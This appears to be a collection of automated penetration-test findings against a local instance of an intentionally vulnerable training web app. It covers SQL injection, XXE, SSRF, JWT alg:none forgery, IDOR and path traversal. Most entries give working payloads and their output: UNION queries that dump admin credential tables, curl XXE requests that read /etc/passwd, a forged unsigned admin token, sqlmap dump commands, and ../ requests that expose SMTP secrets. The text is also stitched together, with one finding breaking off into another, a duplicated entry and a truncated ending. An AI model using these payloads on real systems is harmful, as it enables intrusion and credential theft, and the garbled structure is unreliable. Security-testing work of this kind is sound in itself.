remediation: Never pass user input to a URL/file open primitive. (a) allow-list only http/https; explicitly reject file:, gopher:, dict:, ftp:, jar: and any other scheme; (b) resolve the hostname and block loopback/RFC1918/link-local/metadata ranges (127.0.0.0/8, 10/8, 172.16/12, 192.168/16, 169.254.0.0/16, ::1, fd00::/8) both before connecting and after each redirect; (c) execute the fetch in an egress-restricted worker that cannot reach loopback or the local filesystem; (d) require authentication and validate the URL against a server-side allow-list of known-good hosts; (e) do not echo the fetched body back to the client. Apply the same control to LEVEL_2/LEVEL_3, which remain SSRF-exploitable over http(s) even though they reject file://.
verification_method: Re-fired the OOB callback on LEVEL_1, LEVEL_2 and LEVEL_3 (all returned the interactsh body in the response), re-read file:///etc/passwd and file:///proc/self/environ on LEVEL_1, and re-confirmed the differential that LEVEL_2/LEVEL_3 reject file:// with "Provided URL not valid".
verification_notes: Reproduced unauthenticated across multiple runs. The OOB HTTP interaction is the zero-false-positive oracle for the SSRF (the interactsh response body was returned inside our JSON). The file:// escalation is confirmed by genuine host filesystem content coming back (/etc/passwd, /proc/self/environ, /proc/self/cmdline). Scope caveat verified by differential: file:// works on LEVEL_1 only; SSRF over http(s) works on all three levels.

title: UNION + boolean + error-based SQL Injection in ErrorBasedSQLInjectionVulnerability/LEVEL_2?id= — full auth_users credential dump (new level, not covered by prior scan)
description: The `id` query parameter on /ErrorBasedSQLInjectionVulnerability/LEVEL_2 is concatenated into the SQL statement `select * from cars where id='<id>'` with NO parameterisation and NO escaping. The query is built with single-quoted string context, so the opening quote of the input is simply absorbed and the value is injectable with `1' <payload> --`. This endpoint is a DISTINCT vulnerability instance from LEVEL_1: LEVEL_1 injects an unquoted numeric context while LEVEL_2 injects a quoted string context, and it was not covered by the earlier scan which only reported LEVEL_1. Three separate injection techniques were proven on this single parameter, and all three give full read access to the backend H2 database: (1) boolean-based blind (`AND <cond>`), (2) error-based (raw H2 JdbcSQLSyntaxErrorException with the executed SQL echoed back), and (3) UNION-based, where the attacker fully controls the returned row. Using the UNION vector the attacker can place an arbitrary sub-select into a displayed column and dump arbitrary tables. I dumped the complete `auth_users` table: all 11 admin usernames, their passwords in every representation the app stores (plaintext, MD5, SHA1, SHA256, bcrypt), and their roles — plus the full PUBLIC schema table list. This yields full database compromise and, combined with the plaintext/weak credential rows, credential-based takeover of any account.
proof_of_concept:
1) BASELINE (no injection): id=1
   -> {"isCarPresent":true,"carInformation":{"id":1,"name":"Audi","imagePath":"/VulnerableApp/images/cars/Audi.jpg"}}

2) UNION ROW FORGERY (attacker controls the response):
   id=0' UNION SELECT 1,2,3--
   -> {"isCarPresent":true,"carInformation":{"id":1,"name":"2","imagePath":"3"}}

3) SCHEMA EXFILTRATION:
   id=0' UNION SELECT 1,(SELECT STRING_AGG(table_name,',') FROM information_schema.tables WHERE table_schema='PUBLIC'),3--
   -> "name":"CARS,AUTH_USERS,CRYPTOGRAPHIC_FAILURES_VAULT,IDOR_USERS,BOOKS,OTP_USERS,OTP_TOKENS,SESSION_USERS,PASSWORD_RESET_USERS,USERS,PASSWORD_RESET_TOKENS,POSTS"

4) CREDENTIAL DUMP (auth_users, all admins):
   id=0' UNION SELECT 1,(SELECT STRING_AGG(username||':'||password||':'||role,' | ') FROM auth_users),3--
   -> "name":"admin_sqli:not_needed_for_sqli:ADMIN | admin_logs:v9K#2mLp!8zQ:ADMIN | admin_plain:b7X$4nRj-6mW:ADMIN | admin_md5:84b2db8c58e7b24eeeab1ced704aed8a:ADMIN | admin_sha1:cc9f65e23e5531b877559f24efa19ee0f54168f3:ADMIN | admin_sha256:06991471fe08cd4cac889046b89d9da3643260cade37c4c923c20289efc498e1:ADMIN | admin_enum:0a81e6daca6e13eb4f3ecba40a7fe9d234768d11a60ea855fabdac493221cfcb:ADMIN | admin_weak:$2a$10$gV2vZ5fxhZlwOP.GIqOI1.z7q5jws8VDmgIcKqY/uzvhzSUDio2sW:ADMIN | admin_secure:$2a$10$1WiFUNqUY/vHTzR2QtuMQuzCLK3aZEdjEUpqS4msXOevaCz7Wobe.:ADMIN | admin_lowcost:$2a$04$rK/CT/Bz7GjjGLnB3WWjTOpMpNcGJzmoh.bdc7gQJ4DBQnKj9xnHC:ADMIN"

5) 2ND METHOD (independent tool confirmation):
   sqlmap -u "http://172.17.0.1:9090/VulnerableApp/ErrorBasedSQLInjectionVulnerability/LEVEL_2?id=1" -p id --dbms=H2 --batch
   -> reports the parameter vulnerable via THREE techniques:
      Type: boolean-based blind  (id=1' AND 9394=9394 AND 'iKqJ'='iKqJ)
      Type: error-based           (id=1' AND 1420=ROTATELEFT(CAST(... AS INT),1) AND 'VsgC'='VsgC)
      Type: UNION query           (id=1' UNION ALL SELECT CHAR(...),NULL,NULL-- TgzY)
remediation: Use a PreparedStatement with a bound parameter (`WHERE id = ?`) instead of string concatenation for every query, on every level of this challenge. Apply the same fix to LEVEL_1 and all other SQL-injection challenge levels. Never echo raw SQLException text or the executed statement back to the client — return a generic error. Store passwords only as salted adaptive hashes (bcrypt/Argon2); delete the plaintext, MD5, SHA1 and SHA256 credential rows. Add an automated regression test asserting `id=0' UNION SELECT 1,2,3--` returns no attacker-controlled data.
verification_method: Re-ran the UNION credential-dump payload against the live endpoint a second time and got a byte-identical auth_users dump; separately ran sqlmap with a flushed session which independently reported boolean-based, error-based and UNION injection on the same parameter with its own independently-generated payloads.
verification_notes: Reproduced twice by manual payload and once by sqlmap (independent payloads, 27 requests). The control case id=1 returns a normal car row and id=0' UNION SELECT 1,(...),3 returns the attacker-chosen aggregate, proving the response is genuinely SQL-derived and not a coincidence. LEVEL_2 uses a quoted-string query context (where id='X'), distinct from LEVEL_1's unquoted numeric context.

title: Blind xxe confirmed via OOB callback
description: Out-of-band interaction confirmed: a unique callback host injected into the `XML body (name/author/isbn/publisher/otherComments)` parameter of oob-http http://172.17.0.1:9090/VulnerableApp/XXEVulnerability/LEVEL_1 caused the server to reach attacker-controlled infrastructure at oob1b54248f04aa.daumog0hgqag02n2bjk0utqfr3hko8uxa over dns (interaction daumog0hgqag02n2bjk0utqfr3hko8uxa). This proves the server dereferenced attacker input; classified as blind xxe from the callback protocol.
proof_of_concept: OOB callback oob1b54248f04aa.daumog0hgqag02n2bjk0utqfr3hko8uxa interaction daumog0hgqag02n2bjk0utqfr3hko8uxa at 2026-09-30T20:27:44.783935+00:00
verification_method: oob_callback
verification_notes: Out-of-band interaction daumog0hgqag02n2bjk0utqfr3hko8uxa on oob1b54248f04aa.daumog0hgqag02n2bjk0utqfr3hko8uxa (protocol dns; agent label xxe)

title: XML External Entity (XXE) injection in /XXEVulnerability/LEVEL_1 — arbitrary local file read via file:// entity
description:
POST /VulnerableApp/XXEVulnerability/LEVEL_1 (and LEVEL_2, LEVEL_3) accepts a client-supplied XML document and parses it with external entity resolution ENABLED. There is no authentication, no CSRF token and no input validation. An anonymous client can declare a DOCTYPE with an external entity and have the server read arbitrary local files and echo the content back in the JSON `content` field.
Proven reads (unauthenticated):
- /etc/hostname -> "e2e666e5ef13"
- /etc/passwd (full user list) via the <others> field
- /app/jib-main-class-file -> "org.sasanlabs.Application" (application source/layout disclosure)
Impact: any file readable by the application process can be exfiltrated — configuration files, secrets, keys, source. This is a pre-auth arbitrary local file disclosure independent of the SSRF endpoint (different code path: XML parser vs URL fetch), so fixing one does not fix the other. LEVEL_2/LEVEL_3 are also injectable but returned an empty entity value, so LEVEL_1 is the reliably exploitable variant (the app ships LEVEL_1 as the intentionally-vulnerable level).
Note on scope: the `http://` external-entity variant did NOT fire a callback (entity resolved empty) — this parser appears to resolve file:// but block/refuse remote entities, so the finding is filed on the demonstrated file-read impact, not on an OOB callback.
proof_of_concept:
curl -s -X POST "http://172.17.0.1:9090/VulnerableApp/XXEVulnerability/LEVEL_1" \
  -H 'Content-Type: application/xml' \
  --data '<?xml version="1.0"?><!DOCTYPE book [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><book><name>&xxe;</name><author>a</author><isbn>1</isbn><publisher>p</publisher><others>o</others></book>'
-> {"content":{"name":"e2e666e5ef13\n","isbn":"1","author":"a","publisher":"p","others":"o"},"isValid":true}

Full /etc/passwd disclosure (entity placed in the <others> field):
curl -s -X POST "http://172.17.0.1:9090/VulnerableApp/XXEVulnerability/LEVEL_1" \
  -H 'Content-Type: application/xml' \
  --data '<?xml version="1.0"?><!DOCTYPE book [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><book><name>n</name><author>a</author><isbn>1</isbn><publisher>p</publisher><others>&xxe;</others></book>'
-> {"content":{"name":"n","isbn":"1","author":"a","publisher":"p","others":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin/usr/sbin/nologin\nbin:x:2:2:bin:/bin:...  ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash"},"isValid":true}

Baseline control (no DOCTYPE) returns the literal input, proving the value is read from disk, not reflected:
curl -s -X POST ".../LEVEL_1" -H 'Content-Type: application/xml' --data '<book><name>test</name>...'
-> {"content":{"name":"test",...},"isValid":true}

All requests sent with NO cookie / NO Authorization header.
remediation: Disable external entity and DTD processing in the XML parser used by this endpoint. Concretely for the JDK's DocumentBuilderFactory/SAXParserFactory/XMLInputFactory: set setFeature("http://apache.org/xml/features/disallow-doctype-decl", true), setFeature("http://xml.org/sax/features/external-general-entities", false), setFeature("http://xml.org/sax/features/external-parameter-entities", false), setXIncludeAware(false) and setExpandEntityReferences(false). Better still, do not accept raw XML from the client at all — accept JSON. Additionally run the service as a non-root user with a read-only filesystem so that a parser bug cannot read /etc/shadow or application secrets. Add a regression test asserting that a DOCTYPE-bearing request is rejected with 400.
verification_method: Re-issued the /etc/hostname payload twice and the /etc/passwd payload (in two different fields) from a clean unauthenticated client; all returned the genuine host filesystem content, and the no-DOCTYPE control request returned the literal input instead.
verification_notes: Reproduced twice+ unauthenticated. Evidence is genuine file content (hostname e2e666e5ef13 matches /etc/hostname, /app/jib-main-class-file matches the app entrypoint read earlier over the SSRF sink). LEVEL_2/LEVEL_3 accept the DOCTYPE but resolve the entity to an empty string, so impact is asserted for LEVEL_1 only. The http:// OOB entity did not produce a callback, so no remote-XXE/blind-XXE claim is made.

title: Boolean-based blind SQL Injection in BlindSQLInjectionVulnerability/LEVEL_2?id= — extracts real credential data (admin_logs password), not covered by prior scan
description: The `id` query parameter on /BlindSQLInjectionVulnerability/LEVEL_2 is concatenated into a SQL statement in a single-quoted string context (`select ... where id='<id>'`) without parameterisation or escaping, and the response leaks a single boolean `{"isCarPresent": true|false}`. This is a clean, fully-working boolean-based blind SQL injection: the request returns true only when the injected SQL predicate is satisfied by a real row in the database. It is a DIFFERENT level from the previously-reported LEVEL_1 instance (LEVEL_1 is the unquoted numeric-context challenge; LEVEL_2 is the quoted-string-context challenge) and was NOT covered by the earlier scan. Because the oracle is a true/false on a live row, an attacker can extract arbitrary database contents one boolean at a time, including credentials. I proved extraction of real secret data: `1' or (select password from auth_users where username='admin_logs')='v9K#2mLp!8zQ' --` returns isCarPresent:true, while substituting a wrong password returns isCarPresent:false — proving the oracle reads the actual `auth_users` table and that the plaintext administrator password `admin_logs` = `v9K#2mLp!8zQ` was recovered from the backend.
proof_of_concept:
Oracle is the JSON boolean `isCarPresent`.

CONTROL (no injection):   id=1        -> { "isCarPresent": true }
CONTROL (false base):      id=9999    -> { "isCarPresent": false }

INJECTION TRUE :  id=9999' or '1'='1'  --   -> { "isCarPresent": true }
INJECTION FALSE:  id=9999' and '1'='2' --   -> { "isCarPresent": false }   (conditions change the answer -> real boolean oracle, not a constant)

DATA EXTRACTION (real credential recovered):
  id=9999' or (select password from auth_users where username='admin_logs')='v9K#2mLp!8zQ' --
  -> { "isCarPresent": true }        <-- CORRECT password for admin_logs

NEGATION (proves it is reading live data, not always-true):
  id=9999' or (select password from auth_users where username='admin_logs')='NOPE' --
  -> { "isCarPresent": false }

  id=9999' or (select username from auth_users where username='admin_sqli')='admin_sqli' --   -> true
  id=9999' or (select username from auth_users where username='admin_sqli')='zzz'     --   -> false

The true/false split on the exact plaintext value v9K#2mLp!8zQ is the recovered ADMIN password for the `admin_logs` account, extracted from the backend database via this blind oracle.
remediation: Use a PreparedStatement with a bound parameter (`WHERE id = ?`) instead of string concatenation. Do not leak a distinguishable boolean oracle in responses — return a generic failure for missing/erroneous ids. Apply the same fix across every level of the BlindSQLInjection challenge. Rate-limit and monitor this endpoint for high-volume boolean probing.
verification_method: Reproduced the boolean oracle multiple times: correct-plaintext subquery returns true, wrong-plaintext returns false, and the simple true/false condition pair flips as expected. Confirmed non-existence via the id=9999 base case returning false.
verification_notes: LEVEL_2 is a distinct vulnerable instance (quoted-string context) from the previously reported LEVEL_1. The extraction is verified by a true/false differential on the actual stored password value v9K#2mLp!8zQ for admin_logs, not a constant response. Note the `#` in the password does not break the payload because it sits inside the quoted string, not as a comment.

title: Broken Object Level Authorization (IDOR) in IDORVulnerability — any user reads all users' salary and role
description: The profile-fetch endpoint performs no object-level authorization. After logging in as the lowest-privilege account (Alice, userId=1, role=USER), requesting an arbitrary `id` returns the full record of any other user, including their username, salary and role. The response for id=3 discloses the ADMIN account (Charlie, salary 70000, role ADMIN) to a non-privileged session, i.e. the API leaks both PII of other users and the existence/identity of the administrator account. This is a full horizontal (BOLA) plus vertical information-disclosure authorization break.
remediation: Enforce object-level authorization server-side: compare the requested `id` against the authenticated principal's subject claim and reject (403) any mismatch, or scope every query with `WHERE id = <current_user_id>`. Never trust a client-supplied object id without an authorization check. Consider a policy layer (e.g. Spring Security @PreAuthorize / method-level `@PostAuthorize`) plus negative tests covering cross-tenant and cross-role access.
verification_method: Re-ran the login as Alice (userId=1, role=USER) and re-requested id=2 and id=3 with the resulting cookie; the responses again contained Bob's and Charlie's (role=ADMIN) salary and role. Also confirmed a fresh unauthenticated request returns {"content":"Provide login or token"} so the disclosure requires only a normal low-privilege account.
verification_notes: Reproduced twice with two independently minted Alice sessions (different iat/exp) — identical disclosure both times. Impact confirmed = disclosure of other users' PII (salary) and the privileged role assignment. Note the low-privilege account password is a demo default shipped in the HTML, so no prior privileged access is required beyond knowing a valid username.
prerequisite: authenticated_session (any low-privilege account; demo password is embedded in the page source)

title: JWT "alg:none" authentication bypass in JWTVulnerability LEVEL_6 — unsigned forged token accepted as valid
description: The server-side JWT verifier at /JWTVulnerability/LEVEL_6 accepts a token whose header declares `alg: none` and which carries an EMPTY signature. The library trusts the attacker-controlled `alg` header instead of pinning an expected algorithm, so any party can mint a token asserting arbitrary identity and privileged claims (sub, name, role=ADMIN, admin=true) and have the server mark it `isValid: true`. This is a complete authentication bypass: the signature check is effectively optional because the attacker chooses the algorithm that disables it. The control tests prove the flaw is specific to the none-alg path — an HS256 token with a wrong key is correctly rejected, and a garbage token errors out, so the success is not a blanket "accept anything" bug.
proof_of_concept:
Attacker forges a JWT with header {"alg":"none","typ":"JWT"}, payload {"sub":"9999","name":"evil","role":"ADMIN","admin":true} and NO signature (third segment is the empty string):

    F2=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiI5OTk5IiwibmFtZSI6ImV2aWwiLCJyb2xlIjoiQURNSW4iLCJhZG1pbiI6dHJ1ZX0.

    curl -s -H "Cookie: JWT=$F2" "http://172.17.0.1:9090/VulnerableApp/JWTVulnerability/LEVEL_6"
    => {"content":null,"isValid":true}

The forged token claims subject 9999 / role ADMIN / admin=true and the server accepts it as valid.

Reproduction / controls:
- alg=none, sub=1, name=attacker, role=ADMIN, admin=true, empty sig  => {"content":null,"isValid":true}   (ACCEPTED - bypass)
- alg=none, sub=9999, name=evil, role=ADMIN, admin=true, empty sig => {"content":null,"isValid":true}   (ACCEPTED - arbitrary identity)
- alg=HS256 signed with a wrong key (eyJhbGciOiJIUzI1NiJ9...AAAA)   => {"content":"JWT=...","isValid":false}   (correctly rejected)
- Cookie: JWT=notatoken                                               => System Error (garbage rejected)
- No cookie at all                                                    => System Error (requires a token to be present)
remediation: Pin the expected algorithm server-side and reject `none` outright. With jjwt, build the parser with `.setSigningKey(secret)` (never `.parseClaimsJws()` in a way that honours the header) and explicitly call `signWith(Keys.hmacShaKeyFor(bytes), Jwts.SIG.HS256)` so only HS256 is ever produced/accepted. Additionally validate the `alg` header against an allowlist before verifying, require a non-empty signature, and reject any token whose header alg is `none`/`None`/`nOnE`. Rotate the signing key and consider a JWKS-pinned asymmetric algorithm (RS256/ES256) so clients cannot influence algorithm selection at all.
verification_method: Re-ran the forged alg=none token twice with two different arbitrary identities (sub=1/role=ADMIN and sub=9999/role=ADMIN) - both returned isValid:true. Re-ran the wrong-key HS256 control in the same session and it returned isValid:false, confirming the acceptance is specifically the none-algorithm path and not a permissive parser.
verification_notes: Reproduced across multiple distinct forged payloads. The response schema {"content":null,"isValid":true} is the same one the app uses to report a valid token (the legitimate token also returns content:null,isValid:true), so the forged token is indistinguishable from a genuinely signed one at the verification oracle. Impact is full identity/claim forgery: any role or subject the consuming application trusts in the JWT can be asserted by an unauthenticated attacker.

title: SQL Injection Authentication Bypass in AuthenticationVulnerability LEVEL_1 (username & password) — returns ADMIN account object
description: The `username` and `password` GET parameters on the AuthenticationVulnerability LEVEL_1 login endpoint are concatenated directly into an H2 SQL query: `SELECT * FROM auth_users WHERE level=1 AND username='<in>' AND password='<in>'`. Injecting a tautology in either parameter bypasses authentication entirely and returns the privileged account object (userId, username, email, role=ADMIN) as valid. sqlmap independently confirmed error-based (H2 CAST), boolean-based (OR ... NOT) and UNION-based injection with 8 columns on the `username` parameter. The backend is H2 and full error messages (including the full SQL statement) are reflected to the client. Impact: complete authentication bypass and disclosure of the ADMIN user's identity attributes; because error text reflects the executed SQL, this is also a DB read primitive.
proof_of_concept:
Auth bypass via username:
GET /VulnerableApp/AuthenticationVulnerability/LEVEL_1?username=ta'%20OR%20'1'='1'%20--&password=x
Response: {"content":{"userId":1,"username":"admin_sqli","email":"admin_sqli@example.com","role":"ADMIN"},"isValid":true}

Auth bypass via password (username=valid account):
GET ...?username=admin_sqli&password=' OR '1'='1'--
Response: {"content":{"userId":1,"username":"admin_sqli","email":"admin_sqli@example.com","role":"ADMIN"},"isValid":true}

Baseline (no injection) = {"content":"Invalid credentials","isValid":false}

sqlmap confirmation:
$ sqlmap -u "http://172.17.0.1:9090/VulnerableApp/AuthenticationVulnerability/LEVEL_1?username=admin&password=x" -p username --batch --dbms=H2 --level=5 --risk=3
Parameter: username (GET) is vulnerable (boolean-based blind OR, H2 error-based CAST, Generic UNION query NULL 8 columns). back-end DBMS: H2.

Error-based DB read (reflects executed SQL):
GET ...?username=admin_sqli' AND 1=CAST((SELECT username FROM auth_users WHERE level=1 LIMIT 1) AS INT)--&password=x
Response: Data conversion error converting "admin_sqli"
remediation: Use parameterized/prepared statements (JDBC PreparedStatement with bound parameters) for all DB access; never concatenate user input into SQL. Remove detailed SQL error messages from client responses (return generic errors). Add input validation and use a real authentication mechanism instead of string-matched login.
verification_method: Reproduced the auth bypass manually with curl (baseline returns isValid:false; injected tautology returns isValid:true with the ADMIN object) and independently confirmed the injection point with sqlmap (error-based H2, boolean-based OR, UNION 8-col).
verification_notes: Verified by direct reproduction with curl multiple times (both username and password params) and by sqlmap --batch detection. Impact proven: authenticated ADMIN context returned without valid credentials.

title: SQL Injection in UnionBasedSQLInjectionVulnerability LEVEL_1 (?id=) — boolean + UNION, sqlmap dumped full H2 PUBLIC schema incl. AUTH_USERS plaintext admin credentials
description:
The `id` GET parameter of UnionBasedSQLInjectionVulnerability LEVEL_1 is concatenated directly into an H2 SQL statement with no parameterisation. An unauthenticated attacker can (a) read any row with a boolean oracle and (b) extract arbitrary data with a 3-column UNION SELECT, since the endpoint reflects the selected columns straight back as JSON (`name` and `imagePath` map to the 2nd/3rd result columns).

Impact proven end-to-end: sqlmap (`--level=5 --risk=3 --dbs --tables --dump`) enumerated 2 databases (INFORMATION_SCHEMA, PUBLIC), 12 tables in PUBLIC (AUTH_USERS, BOOKS, CARS, CRYPTOGRAPHIC_FAILURES_VAULT, IDOR_USERS, OTP_TOKENS, OTP_USERS, PASSWORD_RESET_TOKENS, PASSWORD_RESET_USERS, POSTS, SESSION_USERS, USERS) and dumped credential material verbatim, including the entire AUTH_USERS table (10 rows) and IDOR_USERS (3 rows). AUTH_USERS stores every administrator password in the clear or as a weak unsalted digest: admin_plain = `b7X$4nRj-6mW` (PLAIN), admin_logs = `v9K#2mLp!8zQ` (PLAIN), admin_md5 = MD5, admin_sha1 = SHA-1, admin_enum = salted SHA-256, admin_weak/admin_secure = bcrypt cost 10, admin_lowcost = BCRYPT_LOW_ITERATION cost 4 (crackable at high speed). IDOR_USERS leaks per-user password salts+hashes and the salary/role of every employee including the ADMIN row (Charlie, 70000). CRYPTOGRAPHIC_FAILURES_VAULT leaks 11 stored secrets, including CLEARTEXT, BASE64, CAESAR, MD4, MD5, SHA-1, LM and AES-128 ciphertext.

The dumped credentials were replayed successfully against the live login (see verification_notes) to obtain a valid authenticated ADMIN session — so this is not just DB read, it is direct account takeover.
proof_of_concept:
1) Boolean oracle (unauthenticated):
GET /VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_1?id=1%20AND%201=1
-> {"id":1,"name":"Audi","imagePath":"/VulnerableApp/images/cars/Audi.jpg"}
GET ...?id=1%20AND%201=2
-> {"id":0,"name":null,"imagePath":null}

2) UNION exfiltration of arbitrary columns (single request, no auth):
GET /VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_1?id=-1%20UNION%20ALL%20SELECT%20NULL,USERNAME,PASSWORD%20FROM%20AUTH_USERS%20WHERE%20USERNAME='admin_plain'
-> {"id":0,"name":"admin_plain","imagePath":"b7X$4nRj-6mW"}

3) sqlmap confirmation (tool_outputs/sqlmap_ubl1, sqlmap_ubl1_t, sqlmap_ubl1_dump):
back-end DBMS: H2
available databases [2]: INFORMATION_SCHEMA, PUBLIC
Database: PUBLIC - 12 tables incl. AUTH_USERS, IDOR_USERS, CRYPTOGRAPHIC_FAILURES_VAULT
AUTH_USERS dumped -> 10 entries, e.g. |3|admin_plain@example.com|ADMIN|3|b7X$4nRj-6mW|admin_plain|PLAIN|
and the crypto vault -> level 1 CLEARTEXT A16~];@m8J, level 4 CUSTOM RWdmM2osUG03Risl, level 10 AES-128 jLRvbgURUwbjIe7I7441VA==

4) Replay of the dumped credential yields an authenticated ADMIN session (see verification_notes).
verification_method: Re-issued the boolean oracle, the UNION SELECT exfiltration and the sqlmap --dump run from a clean session (--flush-session); then replayed a dumped plaintext credential against the live login form and received isValid:true with role ADMIN.
verification_notes: VERIFIED TWICE. (a) Replay: GET /VulnerableApp/AuthenticationVulnerability/LEVEL_3?username=admin_plain&password=b7X$4nRj-6mW returned {"content":{"userId":3,"username":"admin_plain","email":"admin_plain@example.com","role":"ADMIN","passwordInDB":"b7X$4nRj-6mW"},"isValid":true} — the credential extracted purely via the SQLi authenticates as ADMIN. (b) The injection reproduces deterministically on every retry (boolean true/false pair, UNION SELECT, and sqlmap re-identification from a flushed session). Note the login response itself leaks passwordInDB (excessive data exposure) — see the separate finding.
gained: db_read + credential_dump + admin_account_takeover (authenticated ADMIN session obtained by replaying an SQLi-dumped plaintext password)

title: Blind SQL Injection in BlindSQLInjectionVulnerability LEVEL_1 (?id=) — boolean oracle extracts arbitrary H2 data (proven on AUTH_USERS)
description:
The `id` GET parameter of the blind-SQLi endpoint is concatenated into an H2 query whose only observable effect is a boolean JSON field `isCarPresent`. A boolean oracle (response true/false) is enough to read arbitrary data from any table in the PUBLIC schema character-by-character, which sqlmap automates.

Proven impact: sqlmap (`-u .../BlindSQLInjectionVulnerability/LEVEL_1?id=1 -p id --level=5 --risk=3 --dbs`) identified the parameter as boolean-based blind injectable, confirmed the back-end DBMS as H2, and enumerated both databases (INFORMATION_SCHEMA, PUBLIC). Manual use of the oracle then pulled real application data: `1 AND (SELECT COUNT(*) FROM AUTH_USERS WHERE USERNAME='admin_plain')=1` returns {"isCarPresent": true} while the same query with a non-existent username returns false — proving arbitrary sub-select execution over the application's user table, unauthenticated.

This is the stealthier twin of the LEVEL_1 union injection: no UNION is required, nothing is reflected, so it is stealthy to detection but yields the same data — the credential tables reachable here include AUTH_USERS (admin passwords) and CRYPTOGRAPHIC_FAILURES_VAULT.

title: Blind SQL Injection in BlindSQLInjectionVulnerability LEVEL_1 (?id=) — boolean oracle extracts arbitrary H2 data (proven on AUTH_USERS)
description: The `id` GET parameter of the blind-SQLi endpoint is concatenated into an H2 query whose only observable effect is a boolean JSON field `isCarPresent`. A boolean oracle (true/false) is enough to read arbitrary data from any table in the PUBLIC schema character-by-character, which sqlmap automates. Proven: sqlmap identified the parameter as boolean-based blind injectable, confirmed back-end DBMS H2, and enumerated both databases (INFORMATION_SCHEMA, PUBLIC). Manual use of the oracle then pulled real application data unauthenticated. No UNION needed, nothing reflected — same data reachable as the LEVEL_1 union injection, including AUTH_USERS admin passwords and CRYPTOGRAPHIC_FAILURES_VAULT.
remediation: Use PreparedStatement/parameter binding for all DB access. Do not expose raw boolean query results to unauthenticated clients. Gate the training module behind a build-time flag disabled in production.
verification_method: Re-ran the true/false oracle pair and the two sub-select probes from a clean sqlmap session (--flush-session); all four reproduced identically.
verification_notes: VERIFIED. Re-issued after the initial run: true/false pair and both sub-select probes returned the same booleans, and sqlmap re-identified the injection with a flushed session (tool_outputs/sqlmap_bl1).

title: SQL Injection in `username` parameter of /AuthenticationVulnerability/LEVEL_1 — unauthenticated ADMIN account takeover (previously unreported param)
description: The login form concatenates the `username` GET/POST parameter directly into an H2 SQL query with no parameterisation. Any anonymous remote user can inject boolean/UNION conditions to (a) force the authentication check to succeed and be logged in as the privileged `admin_sqli` account (role=ADMIN), and (b) extract arbitrary data from the backend H2 database (sqlmap confirms boolean-based blind, H2 error-based (CAST) and UNION-ALL injection and enumerates the schema/tables). This is a separate injection point from the already-reported `password` parameter — the username field alone is enough for a full auth bypass, so any client-side or WAF-side fix that only sanitised the password field leaves the bypass intact.
proof_of_concept:
1) sqlmap detection (tool_outputs/sqlmap/auth_l1.log):
   $ sqlmap -u 'http://172.17.0.1:9090/VulnerableApp/AuthenticationVulnerability/LEVEL_1?username=admin*&password=test' --batch --level=5 --risk=3 --dbs --threads=4
   [INFO] URI parameter '#1*' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT)' injectable
   [INFO] URI parameter '#1*' is 'H2 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (CAST)' injectable
   [INFO] URI parameter '#1*' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable

   $ curl 'http://172.17.0.1:9090/VulnerableApp/AuthenticationVulnerability/LEVEL_1?username=%27%20OR%20%271%27%3D%271%27--%20&password=test'
   {"content":{"userId":1,"username":"admin_sqli","email":"admin_sqli@example.com","role":"ADMIN"},"isValid":true}
   Baseline (no injection): {"content":"Invalid credentials","isValid":false}
remediation: Use parameterised queries (PreparedStatement with bound parameters) for the login statement instead of string concatenation. Never build SQL by concatenating request parameters. Additionally validate/encode input server-side and run the DB account with least privilege.
verification_method: sqlmap --level=5 --risk=3 --dbs + manual curl reproduction of the auth bypass (JSON isValid:true returned for injected username vs isValid:false baseline)
verification_notes: Reproduced twice: once via sqlmap parameter flagging, and once via manual curl which returned a full ADMIN user object (userId/username/email/role) with isValid=true using no credentials at all. Data-extraction depth confirmed via sqlmap --dump on the same parameter (see tool_outputs/sqlmap/auth_dump.log).

title: Mass plaintext credential exposure — 30 `pr_*` account passwords dumped from H2 via SQLi in the login `username` field
description: Using the SQL injection in the login `username` parameter, an anonymous attacker can dump the entire H2 `PUBLIC` schema. title: Path Traversal in /PathTraversal/LEVEL_1?fileName= — reads application.properties incl. SMTP credentials (unauthenticated)
description: The `fileName` query parameter is appended directly to a classpath resource path with no validation. Any `../` sequence walks out of the bundled `scripts/PathTraversal/` resource folder and returns the raw contents of the application's own configuration files to an UNAUTHENTICATED caller. This exposes SMTP mail credentials (spring.mail.username / spring.mail.password), the H2 datasource URLs, server port, and internal benchmark/scanner configuration. Traversal is limited to classpath resources ( /etc/passwd is rejected with isValid:false ), but any file bundled in the application JAR — including schema.sql files with table definitions — is disclosed.
proof_of_concept:
Request (unauthenticated, no session):
GET /VulnerableApp/PathTraversal/LEVEL_1?fileName=../../application.properties

Response 200:
{"content":"server.port=9090server.servlet.context-path=/VulnerableApp...spring.datasource.admin.url=jdbc:h2:mem:testdb...spring.mail.host=mailpitspring.mail.port=1025spring.mail.username=smtp_hackerspring.mail.password=smtp_passwordspring.mail.properties.mail.smtp.auth=false...benchmark.dast.ground-truth.url=http://localhost:9090/VulnerableApp/scanner/dast...","isValid":true}

Baseline: ?fileName=UserInfo.json returns the bundled users JSON (isValid:true), so the parameter is directly resolved. Deep traversal (../../../../../../etc/passwd) returns isValid:false — traversal stays inside the classpath.
remediation: Validate `fileName` against a strict allow-list of permitted resource identifiers (e.g. only `UserInfo.json` / `OwaspAppInfo.json`), or resolve the resource and verify the canonical path stays inside the intended resource directory before returning content. Never expose application.properties (move secrets to environment variables / a secret manager).
verification_method: Re-ran the identical request a second time (curl GET, no cookies) and compared responses
verification_notes: Reproduced twice; both responses identical (2533 bytes of application.properties content). Evidence: tool_outputs/pt_props_verify.txt

title: SQL Injection in ErrorBasedSQLInjectionVulnerability LEVEL_1 (id) — full H2 database + credential table dump (AUTH_USERS)
description: The `id` GET parameter on the ErrorBased SQL Injection endpoints (and the same pattern on Blind/Union SQLi endpoints) is concatenated unsanitised into an H2 query `select * from cars where id=<input>`, with full SQL error messages reflected to the client. $ sqlmap -u "http://172.17.0.1:9090/VulnerableApp/ErrorBasedSQLInjectionVulnerability/LEVEL_1?id=1" -p id --batch --dbms=H2
